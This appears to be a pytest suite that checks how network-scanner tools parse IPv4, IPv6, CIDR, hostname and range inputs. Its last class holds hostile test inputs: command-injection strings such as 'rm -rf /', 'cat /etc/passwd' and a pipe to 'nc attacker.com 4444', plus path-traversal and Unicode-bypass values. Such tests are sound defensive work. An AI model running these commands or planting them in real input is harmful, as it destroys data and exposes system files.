#!/usr/bin/env python3
"""
Edge Case Tests for Network Input Handling
===========================================

Comprehensive edge case tests for network input validation including:
- IPv4 edge cases (0.0.0.0, 255.255.255.255, localhost variations)
- IPv6 inputs and handling
- Invalid CIDR notations
- Hostname resolution edge cases

These tests verify that network-related tools handle unusual inputs
safely and predictably.
"""

import ipaddress
import socket
import sys
from pathlib import Path
from typing import List, Optional
from unittest.mock import patch, MagicMock

import pytest


# Add tools to path for imports
TOOLS_PATH = Path(__file__).parent.parent.parent / "tools"
sys.path.insert(0, str(TOOLS_PATH / "network-scanner"))
sys.path.insert(0, str(TOOLS_PATH / "port-scanner"))


# =============================================================================
# Attempt imports with graceful fallback
# =============================================================================

try:
    from tool import NetworkScanner, ScanConfig
    NETWORK_SCANNER_AVAILABLE = True
except ImportError:
    NETWORK_SCANNER_AVAILABLE = False
    NetworkScanner = None
    ScanConfig = None

try:
    # Import from port-scanner
    sys.path.insert(0, str(TOOLS_PATH / "port-scanner"))
    from tool import PortScanner, ScanConfig as PortScanConfig, parse_port_specification
    PORT_SCANNER_AVAILABLE = True
except ImportError:
    PORT_SCANNER_AVAILABLE = False
    PortScanner = None
    PortScanConfig = None
    parse_port_specification = None


# =============================================================================
# Helper Functions
# =============================================================================

def expand_targets_safe(targets: List[str]) -> List[str]:
    """
    Safely expand targets using NetworkScanner.
    Returns empty list on any error.
    """
    if not NETWORK_SCANNER_AVAILABLE:
        pytest.skip("NetworkScanner not available")
        return []

    try:
        config = ScanConfig(targets=targets)
        scanner = NetworkScanner(config)
        return list(scanner._expand_targets())
    except Exception:
        return []


def is_valid_ipv4(ip_str: str) -> bool:
    """Check if string is a valid IPv4 address."""
    try:
        ipaddress.IPv4Address(ip_str)
        return True
    except (ipaddress.AddressValueError, ValueError):
        return False


def is_valid_ipv6(ip_str: str) -> bool:
    """Check if string is a valid IPv6 address."""
    try:
        ipaddress.IPv6Address(ip_str)
        return True
    except (ipaddress.AddressValueError, ValueError):
        return False


# =============================================================================
# IPv4 Edge Case Tests
# =============================================================================

@pytest.mark.edge_case
class TestIPv4EdgeCases:
    """Edge case tests for IPv4 address handling."""

    @pytest.mark.parametrize("ip,description", [
        ("0.0.0.0", "unspecified address"),
        ("255.255.255.255", "broadcast address"),
        ("127.0.0.1", "standard loopback"),
        ("127.0.0.0", "loopback network start"),
        ("127.255.255.255", "loopback network end"),
        ("127.1.1.1", "alternate loopback"),
        ("127.127.127.127", "mid-range loopback"),
    ])
    def test_special_ipv4_addresses(self, ip: str, description: str):
        """Test that special IPv4 addresses are handled correctly."""
        assert is_valid_ipv4(ip), f"{description} ({ip}) should be valid IPv4"

        if NETWORK_SCANNER_AVAILABLE:
            results = expand_targets_safe([ip])
            # Single IP should produce at most one result
            assert len(results) <= 1, f"{description} should expand to at most 1 IP"
            if results:
                assert is_valid_ipv4(results[0]), f"Result should be valid IPv4"

    @pytest.mark.parametrize("ip,description", [
        ("0.0.0.1", "first usable in 0.0.0.0/8"),
        ("0.255.255.255", "last in 0.0.0.0/8"),
        ("1.0.0.0", "first public IP"),
        ("1.0.0.1", "Cloudflare DNS"),
        ("8.8.8.8", "Google DNS"),
        ("255.255.255.254", "one before broadcast"),
    ])
    def test_boundary_ipv4_addresses(self, ip: str, description: str):
        """Test boundary IPv4 addresses."""
        assert is_valid_ipv4(ip), f"{description} should be valid"

        if NETWORK_SCANNER_AVAILABLE:
            results = expand_targets_safe([ip])
            assert len(results) <= 1

    @pytest.mark.parametrize("localhost_variant", [
        "localhost",
        "LOCALHOST",
        "LocalHost",
        "LocaLHOST",
    ])
    def test_localhost_name_variations(self, localhost_variant: str):
        """Test various localhost name capitalizations."""
        if NETWORK_SCANNER_AVAILABLE:
            # Should not crash on localhost variations
            results = expand_targets_safe([localhost_variant])
            # Results depend on DNS resolution configuration
            # Main assertion is no crash

    @pytest.mark.parametrize("ip", [
        "192.168.001.001",  # Leading zeros
        "010.000.000.001",  # Octal-looking
        "0192.0168.0001.0001",  # Multiple leading zeros
    ])
    def test_ipv4_with_leading_zeros(self, ip: str):
        """Test IPv4 addresses with leading zeros (ambiguous octal notation)."""
        if NETWORK_SCANNER_AVAILABLE:
            # Should handle gracefully - may accept or reject
            try:
                results = expand_targets_safe([ip])
                # If accepted, results should be valid
                for result in results:
                    assert is_valid_ipv4(result)
            except Exception:
                pass  # Rejection is acceptable

    @pytest.mark.parametrize("invalid_ip", [
        "256.0.0.0",
        "0.256.0.0",
        "0.0.256.0",
        "0.0.0.256",
        "-1.0.0.0",
        "0.-1.0.0",
        "0.0.-1.0",
        "0.0.0.-1",
        "1000.0.0.0",
        "0.0.0.1000",
    ])
    def test_invalid_ipv4_octet_values(self, invalid_ip: str):
        """Test that invalid octet values are handled safely."""
        assert not is_valid_ipv4(invalid_ip), f"{invalid_ip} should be invalid"

        if NETWORK_SCANNER_AVAILABLE:
            # Should not crash
            results = expand_targets_safe([invalid_ip])
            # Should return empty or skip invalid
            for result in results:
                assert is_valid_ipv4(result), "Any returned IP must be valid"

    @pytest.mark.parametrize("malformed", [
        "192.168.1",        # Missing octet
        "192.168",          # Two octets only
        "192",              # One octet only
        "192.168.1.1.1",    # Extra octet
        "192..168.1.1",     # Double dot
        ".192.168.1.1",     # Leading dot
        "192.168.1.1.",     # Trailing dot
        "192.168.1.",       # Missing last octet with trailing dot
        "",                 # Empty string
        "   ",              # Whitespace only
        ".",                # Just a dot
        "...",              # Three dots
        "....",             # Four dots
    ])
    def test_malformed_ipv4_structure(self, malformed: str):
        """Test malformed IPv4 address structures."""
        if NETWORK_SCANNER_AVAILABLE:
            # Should handle gracefully without crash
            try:
                results = expand_targets_safe([malformed])
                # Any results should be valid IPs
                for result in results:
                    assert is_valid_ipv4(result)
            except Exception:
                pass  # Exceptions are acceptable for malformed input

    @pytest.mark.parametrize("ip", [
        " 192.168.1.1",      # Leading space
        "192.168.1.1 ",      # Trailing space
        " 192.168.1.1 ",     # Both
        "\t192.168.1.1",     # Tab
        "192.168.1.1\n",     # Newline
        "\r\n192.168.1.1",   # CRLF
        "192 .168.1.1",      # Space in middle
    ])
    def test_ipv4_with_whitespace(self, ip: str):
        """Test IPv4 addresses with various whitespace."""
        if NETWORK_SCANNER_AVAILABLE:
            results = expand_targets_safe([ip])
            # Should either strip whitespace or reject
            for result in results:
                assert is_valid_ipv4(result)
                # Result should not contain whitespace
                assert result.strip() == result


# =============================================================================
# IPv6 Edge Case Tests
# =============================================================================

@pytest.mark.edge_case
class TestIPv6EdgeCases:
    """Edge case tests for IPv6 address handling."""

    @pytest.mark.parametrize("ipv6,description", [
        ("::1", "loopback"),
        ("::", "unspecified"),
        ("::ffff:192.168.1.1", "IPv4-mapped"),
        ("::ffff:0:192.168.1.1", "IPv4-translated"),
        ("fe80::1", "link-local"),
        ("fe80::1%eth0", "link-local with zone ID"),
        ("2001:db8::1", "documentation prefix"),
        ("2001:db8::", "documentation network"),
        ("ff02::1", "all-nodes multicast"),
        ("ff02::2", "all-routers multicast"),
        ("2001:0db8:0000:0000:0000:0000:0000:0001", "full notation"),
        ("2001:db8:0:0:0:0:0:1", "partial zero compression"),
        ("2001:db8::1:0:0:1", "multiple zero sequences"),
    ])
    def test_ipv6_address_formats(self, ipv6: str, description: str):
        """Test various IPv6 address formats."""
        # Strip zone ID for validation
        ipv6_clean = ipv6.split('%')[0]

        if is_valid_ipv6(ipv6_clean):
            # Valid IPv6 - tools should handle gracefully
            pass
        else:
            # Some formats may not be recognized
            pass

        if NETWORK_SCANNER_AVAILABLE:
            # Main test: should not crash
            results = expand_targets_safe([ipv6])
            # IPv6 support may vary - just verify no crash

    @pytest.mark.parametrize("invalid_ipv6", [
        ":::",                          # Too many colons
        "2001:db8::1::1",               # Multiple :: expansions
        "2001:db8:gggg::1",             # Invalid hex
        "2001:db8:12345::1",            # Group too long
        "2001:db8",                     # Too short
        "2001:db8:0:0:0:0:0:0:0:1",     # Too many groups
        "::ffff:192.168.1.256",         # Invalid embedded IPv4
    ])
    def test_invalid_ipv6_formats(self, invalid_ipv6: str):
        """Test invalid IPv6 address formats."""
        if NETWORK_SCANNER_AVAILABLE:
            # Should not crash
            try:
                results = expand_targets_safe([invalid_ipv6])
            except Exception:
                pass  # Acceptable

    def test_ipv6_brackets(self):
        """Test IPv6 addresses with URL-style brackets."""
        ipv6_variants = [
            "[::1]",
            "[2001:db8::1]",
            "[::1]:80",
            "[2001:db8::1]:443",
        ]
        if NETWORK_SCANNER_AVAILABLE:
            for variant in ipv6_variants:
                results = expand_targets_safe([variant])
                # Should handle brackets gracefully


# =============================================================================
# CIDR Notation Edge Cases
# =============================================================================

@pytest.mark.edge_case
class TestCIDREdgeCases:
    """Edge case tests for CIDR notation handling."""

    @pytest.mark.parametrize("cidr,expected_behavior", [
        ("0.0.0.0/0", "entire IPv4 space"),
        ("0.0.0.0/32", "single host"),
        ("255.255.255.255/32", "broadcast single"),
        ("10.0.0.0/8", "Class A private"),
        ("172.16.0.0/12", "Class B private"),
        ("192.168.0.0/16", "Class C private"),
        ("192.168.1.0/24", "standard /24"),
        ("192.168.1.0/30", "point-to-point"),
        ("192.168.1.0/31", "RFC 3021 p2p"),
    ])
    def test_valid_cidr_notations(self, cidr: str, expected_behavior: str):
        """Test valid CIDR notations."""
        if NETWORK_SCANNER_AVAILABLE:
            results = expand_targets_safe([cidr])
            # All results should be valid IPs
            for ip in results:
                assert is_valid_ipv4(ip), f"CIDR {cidr} produced invalid IP: {ip}"

    @pytest.mark.parametrize("cidr", [
        "192.168.1.0/33",   # Prefix too large
        "192.168.1.0/64",   # Way too large
        "192.168.1.0/128",  # IPv6-like prefix
        "192.168.1.0/-1",   # Negative prefix
        "192.168.1.0/-32",  # Negative prefix
    ])
    def test_invalid_cidr_prefix_values(self, cidr: str):
        """Test CIDR with invalid prefix values."""
        if NETWORK_SCANNER_AVAILABLE:
            # Should handle gracefully
            try:
                results = expand_targets_safe([cidr])
                # If it returns results, they should be valid
                for ip in results:
                    assert is_valid_ipv4(ip)
            except Exception:
                pass  # Acceptable

    @pytest.mark.parametrize("cidr", [
        "192.168.1.0/",     # Missing prefix
        "192.168.1.0//24",  # Double slash
        "/24",              # Missing network
        "192.168.1.0/abc",  # Non-numeric prefix
        "192.168.1.0/24.5", # Decimal prefix
        "192.168.1.0/ 24",  # Space in prefix
        "192.168.1.0 /24",  # Space before slash
    ])
    def test_malformed_cidr_syntax(self, cidr: str):
        """Test malformed CIDR syntax."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = expand_targets_safe([cidr])
                for ip in results:
                    assert is_valid_ipv4(ip)
            except Exception:
                pass

    @pytest.mark.slow
    def test_large_cidr_block_performance(self):
        """Test performance with large CIDR blocks."""
        if NETWORK_SCANNER_AVAILABLE:
            # /16 has 65534 hosts - may be slow
            import time
            start = time.time()
            results = expand_targets_safe(["10.0.0.0/20"])  # 4094 hosts
            elapsed = time.time() - start

            # Should complete in reasonable time
            assert elapsed < 10, f"CIDR expansion took too long: {elapsed}s"
            # Verify results
            assert len(results) <= 4094

    def test_cidr_host_bits_set(self):
        """Test CIDR with host bits set (non-strict mode)."""
        if NETWORK_SCANNER_AVAILABLE:
            # 192.168.1.1/24 has host bits set
            results = expand_targets_safe(["192.168.1.1/24"])
            # Should either expand or reject - main test is no crash


# =============================================================================
# Hostname Resolution Edge Cases
# =============================================================================

@pytest.mark.edge_case
class TestHostnameEdgeCases:
    """Edge case tests for hostname resolution."""

    @pytest.mark.parametrize("hostname", [
        "localhost",
        "localhost.localdomain",
        "ip6-localhost",
        "ip6-loopback",
    ])
    def test_localhost_variations(self, hostname: str):
        """Test localhost hostname variations."""
        if NETWORK_SCANNER_AVAILABLE:
            results = expand_targets_safe([hostname])
            # Should resolve or skip - no crash

    @pytest.mark.parametrize("hostname", [
        "",                                 # Empty
        ".",                                # Just a dot
        "..",                               # Double dot
        "...",                              # Triple dot
        "-invalid",                         # Leading hyphen
        "invalid-",                         # Trailing hyphen
        "_invalid",                         # Leading underscore
        "in valid",                         # Space in hostname
        "in\tvalid",                        # Tab in hostname
        "a" * 64,                           # Label too long (max 63)
        "a" * 256,                          # Total too long (max 255)
        f"{'a' * 63}." * 4 + "com",         # Multiple long labels
    ])
    def test_invalid_hostname_formats(self, hostname: str):
        """Test invalid hostname formats."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = expand_targets_safe([hostname])
                # If results returned, verify validity
                for ip in results:
                    assert is_valid_ipv4(ip) or is_valid_ipv6(ip)
            except Exception:
                pass

    def test_nonexistent_hostname(self):
        """Test resolution of clearly nonexistent hostname."""
        if NETWORK_SCANNER_AVAILABLE:
            # Use a hostname that definitely won't resolve
            fake_hostname = "this-hostname-definitely-does-not-exist-xyz123.invalid"
            results = expand_targets_safe([fake_hostname])
            # Should handle gracefully - likely empty result

    @pytest.mark.parametrize("hostname", [
        "example.com",
        "www.example.com",
        "sub.domain.example.com",
        "xn--nxasmq5a.example.com",  # IDN/Punycode
    ])
    def test_real_hostname_formats(self, hostname: str):
        """Test real hostname format patterns (without actual resolution)."""
        if NETWORK_SCANNER_AVAILABLE:
            # Main test is no crash with valid hostname formats
            results = expand_targets_safe([hostname])

    @patch('socket.gethostbyname')
    def test_dns_timeout_handling(self, mock_dns):
        """Test handling of DNS timeout."""
        if NETWORK_SCANNER_AVAILABLE:
            mock_dns.side_effect = socket.timeout("DNS timeout")
            results = expand_targets_safe(["example.com"])
            # Should handle timeout gracefully

    @patch('socket.gethostbyname')
    def test_dns_resolution_error(self, mock_dns):
        """Test handling of DNS resolution failure."""
        if NETWORK_SCANNER_AVAILABLE:
            mock_dns.side_effect = socket.gaierror(8, "Name resolution failed")
            results = expand_targets_safe(["nonexistent.invalid"])
            # Should handle error gracefully

    @pytest.mark.parametrize("hostname", [
        "xn--n3h.com",                      # Punycode (emoji domain)
        "xn--bcher-kva.com",                # Punycode (umlaut)
        "xn--80aswg.xn--p1ai",              # Full IDN
    ])
    def test_internationalized_domain_names(self, hostname: str):
        """Test internationalized domain name (IDN) handling."""
        if NETWORK_SCANNER_AVAILABLE:
            results = expand_targets_safe([hostname])
            # Should handle IDN gracefully


# =============================================================================
# IP Range Edge Cases
# =============================================================================

@pytest.mark.edge_case
class TestIPRangeEdgeCases:
    """Edge case tests for IP range notation."""

    @pytest.mark.parametrize("ip_range,expected_count", [
        ("192.168.1.1-1", 1),      # Single IP range
        ("192.168.1.1-2", 2),      # Minimal range
        ("192.168.1.1-255", 255),  # Full last octet
        ("192.168.1.0-255", 256),  # Complete last octet
        ("192.168.1.254-255", 2),  # End of range
    ])
    def test_valid_ip_ranges(self, ip_range: str, expected_count: int):
        """Test valid IP range specifications."""
        if NETWORK_SCANNER_AVAILABLE:
            results = expand_targets_safe([ip_range])
            # May not match exactly due to implementation
            assert len(results) <= expected_count + 1

    @pytest.mark.parametrize("ip_range", [
        "192.168.1.10-5",       # Reverse range (end < start)
        "192.168.1.-1-10",      # Negative start
        "192.168.1.1--10",      # Double hyphen
        "192.168.1.1-",         # Missing end
        "192.168.1.-10",        # Missing start
        "192.168.1.1-256",      # End out of range
        "192.168.1.1-abc",      # Non-numeric end
        "192.168.1.abc-10",     # Non-numeric start
    ])
    def test_invalid_ip_range_formats(self, ip_range: str):
        """Test invalid IP range formats."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = expand_targets_safe([ip_range])
                for ip in results:
                    assert is_valid_ipv4(ip)
            except Exception:
                pass


# =============================================================================
# Mixed Input Edge Cases
# =============================================================================

@pytest.mark.edge_case
class TestMixedInputEdgeCases:
    """Edge case tests for mixed input types."""

    def test_mixed_valid_inputs(self):
        """Test mix of valid IPs, CIDRs, and ranges."""
        if NETWORK_SCANNER_AVAILABLE:
            targets = [
                "192.168.1.1",
                "10.0.0.0/30",
                "172.16.0.1-5",
            ]
            results = expand_targets_safe(targets)
            for ip in results:
                assert is_valid_ipv4(ip)

    def test_mixed_valid_and_invalid(self):
        """Test mix of valid and invalid inputs."""
        if NETWORK_SCANNER_AVAILABLE:
            targets = [
                "192.168.1.1",       # Valid
                "invalid",           # Invalid
                "10.0.0.0/24",       # Valid
                "256.256.256.256",   # Invalid
            ]
            results = expand_targets_safe(targets)
            # Should process valid ones without crashing on invalid
            for ip in results:
                assert is_valid_ipv4(ip)

    def test_empty_target_list(self):
        """Test empty target list."""
        if NETWORK_SCANNER_AVAILABLE:
            results = expand_targets_safe([])
            assert results == []

    def test_duplicate_targets(self):
        """Test duplicate targets."""
        if NETWORK_SCANNER_AVAILABLE:
            targets = ["192.168.1.1"] * 10
            results = expand_targets_safe(targets)
            # Should handle duplicates (may or may not deduplicate)

    def test_very_long_target_list(self):
        """Test performance with many targets."""
        if NETWORK_SCANNER_AVAILABLE:
            import time
            targets = [f"192.168.1.{i}" for i in range(1, 255)]
            start = time.time()
            results = expand_targets_safe(targets)
            elapsed = time.time() - start

            assert elapsed < 5, f"Processing took too long: {elapsed}s"
            assert len(results) == 254


# =============================================================================
# Security-Focused Edge Cases
# =============================================================================

@pytest.mark.edge_case
@pytest.mark.security
class TestNetworkInputSecurity:
    """Security-focused edge case tests."""

    @pytest.mark.parametrize("injection_attempt", [
        "192.168.1.1; rm -rf /",
        "192.168.1.1 && cat /etc/passwd",
        "$(whoami)",
        "`hostname`",
        "192.168.1.1|nc attacker.com 4444",
        "${IFS}192.168.1.1",
        "192.168.1.1%0als",
        "192.168.1.1\x00malicious",
    ])
    def test_command_injection_resistance(self, injection_attempt: str):
        """Test resistance to command injection attempts."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = expand_targets_safe([injection_attempt])
                # Results should not execute commands
                for ip in results:
                    assert is_valid_ipv4(ip)
                    # Ensure no shell metacharacters
                    dangerous = [';', '|', '&', '$', '`', '\x00']
                    assert not any(c in ip for c in dangerous)
            except Exception:
                pass  # Rejection is acceptable

    @pytest.mark.parametrize("path_traversal", [
        "192.168.1.1/../../../etc/passwd",
        "192.168.1.1%2f..%2f..%2fetc%2fpasswd",
        "192.168.1.1/..\\..\\windows\\system32",
    ])
    def test_path_traversal_resistance(self, path_traversal: str):
        """Test resistance to path traversal attempts."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = expand_targets_safe([path_traversal])
                for ip in results:
                    assert is_valid_ipv4(ip)
                    assert ".." not in ip
                    assert "/" not in ip or ip.count("/") == 1  # CIDR only
            except Exception:
                pass

    @pytest.mark.parametrize("unicode_bypass", [
        "\u0031\u0039\u0032.\u0031\u0036\u0038.\u0031.\u0031",  # Unicode digits
        "192\uff0e168\uff0e1\uff0e1",  # Fullwidth period
        "192\u2024168\u20241\u20241",  # One dot leader
    ])
    def test_unicode_bypass_attempts(self, unicode_bypass: str):
        """Test handling of Unicode bypass attempts."""
        if NETWORK_SCANNER_AVAILABLE:
            try:
                results = expand_targets_safe([unicode_bypass])
                for ip in results:
                    assert is_valid_ipv4(ip)
            except Exception:
                pass
